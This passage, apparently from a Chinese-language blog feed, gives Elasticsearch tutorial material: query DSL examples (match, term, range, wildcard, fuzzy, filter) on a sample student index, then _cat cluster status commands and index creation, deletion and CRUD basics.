class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、 查询年龄为3的（命中：ID = 1)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"query"</span>:&#123;</span><br><span class="line">   <span class="string">"match"</span>:&#123;<span class="string">"age"</span>: 3&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、查询兴趣里包含'演戏'的 （命中 ID = 2,5,4)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"match"</span>:&#123;<span class="string">"interests"</span>: <span class="string">"演戏"</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这里只要interests包含'演戏','演','戏'的都会命中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3、查询索引所有文档 (命中 ID = 1,2,3,4,5)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#4、查询name和address包含'德' (命中 ID = 2)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"multi_match"</span>: &#123;</span><br><span class="line">      <span class="string">"query"</span>: <span class="string">"德"</span>,</span><br><span class="line">      <span class="string">"fields"</span>:[<span class="string">"name"</span>,<span class="string">"address"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#说明 这里文档ID为4的address为'德州'，应该也包含'德'，但却没有被命中，原因是我们索引结构中，address属性是一个keyword类型，它是需要完全匹配，而不是包含的关系。</span></span><br><span class="line"><span class="comment">#如果这里query为'德州'就可以命中2条数据。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#5、查询兴趣里包含'演员'的 （命中 无)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"match_phrase"</span>:&#123;<span class="string">"interests"</span>: <span class="string">"演员"</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 这里和match的区别是这里是真正包含'演员'，而不是只要满足其中一个字就会被模糊命中</span></span><br></pre></td></tr></table></figure><p><code>重点</code> 通过上面的例子有两点比较重要</p><p>1）、文档字段属性如果是一个<code>keyword</code>类型，那就需要完全匹配才能命中。好比这个字段值是<code>12345</code>，那么你不论是<code>1234</code>还是<code>123456</code>都不会命中。</p><p>2）、如果是<code>match_phrase</code>,那就是真正的包含关系。好比这个字段值是<code>12345</code>，那么你是<code>1234</code>就会命中，而<code>123456</code>不会命中。因为12345包含1234而不包含123456。</p><h4 id="2、term查询和terms查询"><a href="#2、term查询和terms查询" class="headerlink" title="2、term查询和terms查询"></a>2、term查询和terms查询</h4><p><code>term query</code>: 会去倒排索引中寻找确切的term，它并不知道分词器的存在。这种查询<strong>适合keyword 、numeric、date</strong>。</p><p><code>term</code>:查询某个字段为该关键词的文档（它是相等关系而不是包含关系）</p><p><code>terms</code>:查询某个字段里含有多个关键词的文档</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、查询地址等于'香港'的文档 （命中：ID = 2,5）</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"term"</span>:&#123; <span class="string">"address"</span>:<span class="string">"香港"</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#如果仅检索'香'那是无法命中的，因为keyword需要完全匹配才能命中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2、查询地址等于"香港"或"北京"的 (命中: ID =2,3,5)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"query"</span>:&#123;</span><br><span class="line">    <span class="string">"terms"</span>:&#123;</span><br><span class="line">      <span class="string">"address"</span>:[<span class="string">"香港"</span>,<span class="string">"北京"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、控制查询返回的数量"><a href="#3、控制查询返回的数量" class="headerlink" title="3、控制查询返回的数量"></a>3、控制查询返回的数量</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#返回前两条数据 （命中: ID = 2,5)</span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"from"</span>:<span class="number">0</span>,</span><br><span class="line">  <span class="attr">"size"</span>:<span class="number">2</span>,</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match"</span>:&#123;<span class="attr">"interests"</span>: <span class="string">"演戏"</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、指定返回的字段"><a href="#4、指定返回的字段" class="headerlink" title="4、指定返回的字段"></a>4、指定返回的字段</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_source"</span>:[<span class="string">"name"</span>,<span class="string">"age"</span>],</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match"</span>:&#123;<span class="attr">"interests"</span>: <span class="string">"演戏"</span>&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5、显示要的字段、去除不需要的字段、可以使用通配符"><a href="#5、显示要的字段、去除不需要的字段、可以使用通配符" class="headerlink" title="5、显示要的字段、去除不需要的字段、可以使用通配符*"></a>5、显示要的字段、去除不需要的字段、可以使用通配符*</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"_source"</span>:&#123;</span><br><span class="line">     <span class="attr">"includes"</span>: <span class="string">"addr*"</span>,</span><br><span class="line">     <span class="attr">"excludes"</span>: [<span class="string">"name"</span>,<span class="string">"bir*"</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6、排序"><a href="#6、排序" class="headerlink" title="6、排序"></a>6、排序</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>:&#123;</span><br><span class="line">    <span class="attr">"match_all"</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line"> <span class="attr">"sort"</span>:[&#123;</span><br><span class="line">        <span class="attr">"age"</span>:&#123;<span class="attr">"order"</span>: <span class="string">"desc"</span>&#125;</span><br><span class="line">      &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7、-范围查询"><a href="#7、-范围查询" class="headerlink" title="7、 范围查询"></a>7、 范围查询</h4><p><code>range</code>: 实现范围查询</p><p><code>include_lower</code>: 是否包含范围的左边界，默认是true</p><p><code>include_upper</code>: 是否包含范围的右边界，默认是true</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、查询生日的范围 （命中 ID = 2,4,5)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"range"</span>: &#123;</span><br><span class="line">            <span class="string">"birthday"</span>: &#123;</span><br><span class="line">                <span class="string">"from"</span>: <span class="string">"1950-01-11"</span>,</span><br><span class="line">                <span class="string">"to"</span>: <span class="string">"1990-01-11"</span>,</span><br><span class="line">                 <span class="string">"include_lower"</span>: true,</span><br><span class="line">                <span class="string">"include_upper"</span>: false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、查询年纪18到28 （命中 ID = 2,3)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"range"</span>: &#123;</span><br><span class="line">            <span class="string">"age"</span>: &#123;</span><br><span class="line">                <span class="string">"from"</span>: 18,</span><br><span class="line">                <span class="string">"to"</span>: 28,</span><br><span class="line">                <span class="string">"include_lower"</span>: true,</span><br><span class="line">                <span class="string">"include_upper"</span>: true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="8、wildcard查询"><a href="#8、wildcard查询" class="headerlink" title="8、wildcard查询"></a>8、wildcard查询</h4><p>允许使用通配符<em> 和 ?来进行查询<br>`</em><code>代表0个或多个字符</code>?` 代表任意一个字符</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、查询姓名'徐'开头的 （命中 ID = 1)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"wildcard"</span>: &#123;</span><br><span class="line">             <span class="string">"name"</span>: <span class="string">"徐*"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#查不到数据 </span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"wildcard"</span>: &#123;</span><br><span class="line">             <span class="string">"name"</span>: <span class="string">"徐小?"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#疑惑：按照正常我觉得这里是可以查到数据的，因为有个name为'徐小小'可以匹配，估计是因为是中文的原因，所以没有匹配到</span></span><br></pre></td></tr></table></figure><h4 id="9、fuzzy实现模糊查询"><a href="#9、fuzzy实现模糊查询" class="headerlink" title="9、fuzzy实现模糊查询"></a>9、fuzzy实现模糊查询</h4><p>模糊查询可以在Match和 Multi-Match查询中使用以便解决拼写的错误，模糊度是基于Levenshteindistance计算与原单词的距离。使用如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（命中： ID = 2,5,4)</span><br><span class="line">GET student/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"query"</span>: &#123;</span><br><span class="line">        <span class="string">"fuzzy"</span>: &#123;</span><br><span class="line">            <span class="string">"interests"</span>: &#123;</span><br><span class="line">                <span class="string">"value"</span>: <span class="string">"演"</span> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#疑惑 :如果我把'演'改成'演员'就查不到数据了</span></span><br></pre></td></tr></table></figure><p>有关<code>fuzzy</code>描述可以参考一篇文章：<a href="https://www.jianshu.com/p/f8edfaf98c4a" target="_blank" rel="noopener">Elasticsearch的误拼写时的fuzzy模糊搜索技术</a></p><h4 id="10、高亮搜索结果"><a href="#10、高亮搜索结果" class="headerlink" title="10、高亮搜索结果"></a>10、高亮搜索结果</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"interests"</span>: <span class="string">"演戏"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span>: &#123;</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">             <span class="attr">"interests"</span>: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、Filter查询"><a href="#三、Filter查询" class="headerlink" title="三、Filter查询"></a>三、Filter查询</h2><p><code>filter是不计算相关性的，同时可以cache。因此，filter速度要快于query</code>。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、获取年龄为3的 （命中 ID = 1）</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123; </span><br><span class="line">  <span class="string">"post_filter"</span>:&#123;</span><br><span class="line">    <span class="string">"term"</span>:&#123;<span class="string">"age"</span>: 3&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#2、查询年纪为3或者63的 （命中 ID = 1,4)</span></span><br><span class="line">GET student/_search</span><br><span class="line">&#123; </span><br><span class="line">  <span class="string">"post_filter"</span>:&#123;</span><br><span class="line">    <span class="string">"terms"</span>:&#123;<span class="string">"age"</span>:[3,63]&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——基本命令</title>
      <link href="/2023/08/07/Elasticsearch%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/08/07/Elasticsearch%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ES集群相关命令"><a href="#1-ES集群相关命令" class="headerlink" title="1.ES集群相关命令"></a>1.ES集群相关命令</h2><p>ES集群相关命令主要是<code>_cat</code>命令，所以这里详细讲解下该命令。</p><h4 id="1、-cat命令"><a href="#1、-cat命令" class="headerlink" title="1、_cat命令"></a>1、_cat命令</h4><p><code>_cat</code>系列提供了一系列查询Elasticsearch集群状态的接口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;_cat&#x2F;allocation      #查看单节点的shard分配整体情况</span><br><span class="line">&#x2F;_cat&#x2F;shards          #查看各shard的详细情况</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;  #查看指定分片的详细情况</span><br><span class="line">&#x2F;_cat&#x2F;master          #查看master节点信息</span><br><span class="line">&#x2F;_cat&#x2F;nodes           #查看所有节点信息</span><br><span class="line">&#x2F;_cat&#x2F;indices         #查看集群中所有index的详细信息</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125; #查看集群中指定index的详细信息</span><br><span class="line">&#x2F;_cat&#x2F;segments        #查看各index的segment详细信息,包括segment名, 所属shard, 内存(磁盘)占用大小, 是否刷盘</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;#查看指定index的segment详细信息</span><br><span class="line">&#x2F;_cat&#x2F;count           #查看当前集群的doc数量</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;   #查看指定索引的doc数量</span><br><span class="line">&#x2F;_cat&#x2F;recovery        #查看集群内每个shard的recovery过程.调整replica。</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;#查看指定索引shard的recovery过程</span><br><span class="line">&#x2F;_cat&#x2F;health          #查看集群当前状态：红、黄、绿</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks   #查看当前集群的pending task</span><br><span class="line">&#x2F;_cat&#x2F;aliases         #查看集群中所有alias信息,路由配置等</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125; #查看指定索引的alias信息</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool     #查看集群各节点内部不同类型的threadpool的统计信息,</span><br><span class="line">&#x2F;_cat&#x2F;plugins         #查看集群各个节点上的plugin信息</span><br><span class="line">&#x2F;_cat&#x2F;fielddata       #查看当前集群各个节点的fielddata内存使用情况</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;     #查看指定field的内存使用情况,里面传field属性对应的值</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs              #查看单节点的自定义属性</span><br><span class="line">&#x2F;_cat&#x2F;repositories           #输出集群中注册快照存储库</span><br><span class="line">&#x2F;_cat&#x2F;templates              #输出当前正在存在的模板信息</span><br></pre></td></tr></table></figure><p>每个命令都支持使用?v参数，让输出内容表格显示表头; pretty则让输出缩进更规范</p><h4 id="2、示例"><a href="#2、示例" class="headerlink" title="2、示例"></a>2、示例</h4><p><strong>1) 节点信息</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"localhost:9200/_cat/nodes?v&amp;pretty"</span></span><br><span class="line"><span class="built_in">ip</span>         heap<span class="number">.</span>percent ram<span class="number">.</span>percent <span class="meta">cpu</span> load_1m load_5m load_15m node<span class="number">.</span>role master name</span><br><span class="line"><span class="number">172.18</span><span class="number">.0</span><span class="number">.4</span>           <span class="number">52</span>          <span class="number">97</span>   <span class="number">6</span>    <span class="number">0.02</span>    <span class="number">0.11</span>     <span class="number">0.28</span> mdi       -      es7_02</span><br><span class="line"><span class="number">172.18</span><span class="number">.0</span><span class="number">.5</span>           <span class="number">57</span>          <span class="number">97</span>   <span class="number">6</span>    <span class="number">0.02</span>    <span class="number">0.11</span>     <span class="number">0.28</span> mdi       *      es7_01</span><br></pre></td></tr></table></figure><ol><li><code>heap.percent</code> 堆内存占用百分比</li><li><code>ram.percent</code> 内存占用百分比</li><li><code>cpu</code> CPU占用百分比</li><li><code>master</code> <code>*</code>表示节点是集群中的<code>主节点</code></li><li><code>name</code> 节点名</li></ol><p><strong>2) 分片信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &quot;localhost:9200&#x2F;_cat&#x2F;shards?v&amp;pretty&quot;</span><br><span class="line">index                           shard prirep state    docs   store ip         node</span><br><span class="line">.monitoring-es-7-2019.08.30     0     p      STARTED 21333  11.8mb 172.18.0.5 es7_01</span><br><span class="line">.monitoring-es-7-2019.08.30     0     r      STARTED 21333  11.8mb 172.18.0.4 es7_02</span><br><span class="line">goods-index                     0     p      STARTED     1   2.5mb 172.18.0.5 es7_01</span><br><span class="line">goods-index                     0     r      STARTED     1   2.5mb 172.18.0.4 es7_02</span><br><span class="line">.kibana_1                       0     p      STARTED     4  22.4kb 172.18.0.5 es7_01</span><br><span class="line">.kibana_1                       0     r      STARTED     4  22.4kb 172.18.0.4 es7_02</span><br></pre></td></tr></table></figure><ol><li><code>index</code> 索引名称</li><li><code>shard</code> 分片序号</li><li><code>prirep</code> <code>p</code>表示该分片是<code>主分片</code>, <code>r</code> 表示该分片是<code>复制分片</code></li><li><code>store</code> 该分片占用存储空间</li><li><code>node</code> 所属节点<code>节点名</code></li><li><code>docs</code> 分片存放的<code>文档</code>数</li></ol><p><strong>3) 索引信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &quot;localhost:9200&#x2F;_cat&#x2F;indices?v&quot;</span><br><span class="line">health status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size</span><br><span class="line">green  open   goods-index                     NhqSRJWUQiu46tdOKol4wA   1   1          1         7018        5mb          2.5mb</span><br><span class="line">green  open   .monitoring-es-7-2019.08.30     lVDNFDVdSXqqrn8CdI_XGg   1   1      21333        18920     23.6mb         11.8mb</span><br><span class="line">green  open   .kibana_1                       rvSlNVjJTsus80klzU19jQ   1   1          4            1     44.9kb         22.4kb</span><br></pre></td></tr></table></figure><ol><li><code>health</code> 索引的健康状态</li><li><code>index</code> 索引名</li><li><code>pri</code> 索引<code>主分片</code>数量</li><li><code>rep</code> 索引<code>复制分片</code> 数</li><li><code>store.size</code> 索引<code>主分片</code> <code>复制分片</code> 总占用存储空间</li><li><code>pri.store.size</code> 索引总占用空间, 不计算<code>复制分片</code> 占用空间</li></ol><h2 id="2-索引CRUD命令"><a href="#2-索引CRUD命令" class="headerlink" title="2.索引CRUD命令"></a>2.索引CRUD命令</h2><h4 id="2-1、查询索引"><a href="#2-1、查询索引" class="headerlink" title="2.1、查询索引"></a>2.1、查询索引</h4><p>查询索引命令上面已经展示过了，这里再补充一些</p><p><strong>条件过滤</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_cat/indices?v&amp;health=yellow   <span class="comment">#查询健康状态为yellow的索引</span></span><br></pre></td></tr></table></figure><p><strong>排序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_cat/indices?v&amp;health=yellow&amp;s=docs.count:desc <span class="comment">#根据文档数量进行索引排序</span></span><br></pre></td></tr></table></figure><p><strong>索引详细信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET "localhost:9200/my_index/_stats?pretty" <span class="comment">#索引详细信息</span></span><br></pre></td></tr></table></figure><h4 id="2、创建索引"><a href="#2、创建索引" class="headerlink" title="2、创建索引"></a>2、创建索引</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PUT /student</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line">        <span class="attr">"number_of_shards"</span>: <span class="number">3</span>,</span><br><span class="line">        <span class="attr">"number_of_replicas"</span>: <span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">            <span class="attr">"properties"</span>: &#123;</span><br><span class="line">                <span class="attr">"name"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>:<span class="string">"text"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"country"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>:<span class="string">"keyword"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"age"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>:<span class="string">"integer"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"date"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">                    <span class="attr">"format"</span>: <span class="string">"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建成功</p><p><img src="/img/es/es2-0.png" alt="es"> </p><h4 id="3、删除索引"><a href="#3、删除索引" class="headerlink" title="3、删除索引"></a>3、删除索引</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="keyword">DELETE</span> <span class="string">"localhost:9200/index-name"</span></span><br></pre></td></tr></table></figure><h2 id="3-文档CRUD命令"><a href="#3-文档CRUD命令" class="headerlink" title="3.文档CRUD命令"></a>3.文档CRUD命令</h2><p>在讲文档的CRUD之前我们要先理解 <code>GET/PUT/POST/DELETE</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /uri        <span class="comment">#创建</span></span><br><span class="line">DELETE /uri/xxx  <span class="comment">#删除</span></span><br><span class="line">PUT /uri/xxx     <span class="comment">#更新或创建</span></span><br><span class="line">GET /uri/xxx     <span 